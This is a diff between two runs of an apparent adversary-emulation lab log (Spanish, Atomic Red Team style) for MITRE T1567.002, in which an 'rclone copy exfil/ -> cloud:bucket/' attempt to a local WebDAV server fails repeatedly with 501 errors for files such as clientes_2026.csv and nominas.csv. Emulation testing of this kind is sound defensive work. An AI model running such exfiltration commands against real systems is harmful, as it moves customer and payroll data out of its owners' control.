@@ -1,7 +1,7 @@
 ATA049 · T1567.002 Exfiltration to Cloud Storage (WebDAV local) — ART adaptado
-T0=2026-11-20T13:23:49Z
+T0=2026-11-20T15:30:29Z
 --- rclone copy exfil/ -> cloud:bucket/ ---
-2026/11/20 14:23:50 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -14,7 +14,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('PROPFIND')
-2026/11/20 14:23:50 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -27,7 +27,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -40,7 +40,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -53,7 +53,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : Attempt 1/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : Attempt 1/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -66,7 +66,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -79,7 +79,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('PROPFIND')
-2026/11/20 14:23:50 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -92,7 +92,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -105,7 +105,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -118,7 +118,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : Attempt 2/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : Attempt 2/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -131,7 +131,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : webdav root 'bucket': error reading destination root directory: couldn't list files: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -144,7 +144,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('PROPFIND')
-2026/11/20 14:23:50 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : clientes_2026.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -157,7 +157,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : nominas.csv: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -170,7 +170,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : notas.txt: Failed to copy: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -183,7 +183,7 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 ERROR : Attempt 3/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 ERROR : Attempt 3/3 failed with 4 errors and: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -196,13 +196,13 @@ T0=2026-11-20T13:23:49Z
         <p>Error code explanation: 501 - Server does not support this operation.</p>
     </body>
 </html>: 501 Unsupported method ('MKCOL')
-2026/11/20 14:23:50 INFO  : 
+2026/11/20 16:30:29 INFO  : 
 Transferred:   	          0 B / 0 B, -, 0 B/s, ETA -
 Errors:                 4 (retrying may help)
 Checks:                 0 / 0, -, Listed 9
 Elapsed time:         0.2s
 
-2026/11/20 14:23:50 NOTICE: Failed to copy with 4 errors: last error was: Update mkParentDir failed: <!DOCTYPE HTML>
+2026/11/20 16:30:29 NOTICE: Failed to copy with 4 errors: last error was: Update mkParentDir failed: <!DOCTYPE HTML>
 <html lang="en">
     <head>
         <meta charset="utf-8">
@@ -222,7 +222,7 @@ bc8bf1dc600bdd8ced2786fd61bb69788fde6f639a538681fbd9f1a4c0a32a51  /home/angel/la
 04c33e33949e30230bd5b4064185db3d4a99f37f2f0dfa7f5b5b50c6a419f4d4  /home/angel/lab-attack/ATA049/exfil/notas.txt
 --- procesos rclone residuales ---
 0
-T1_LOCAL=2026-11-20T13:23:51Z
+T1_LOCAL=2026-11-20T15:30:30Z
 
 --STDERR--
 EXFIL_CLOUD=FALLO (rclone rc=1)
